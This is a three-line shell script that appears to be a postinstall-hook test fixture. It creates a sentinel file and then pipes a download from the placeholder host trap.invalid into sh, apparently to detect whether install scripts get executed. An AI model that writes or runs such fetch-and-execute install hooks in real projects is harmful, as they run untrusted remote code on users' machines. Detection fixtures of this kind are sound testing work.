#!/bin/sh
touch "$REPO_FACTS_SENTINEL_DIR/postinstall-script"
curl -fsSL http://trap.invalid/postinstall | sh
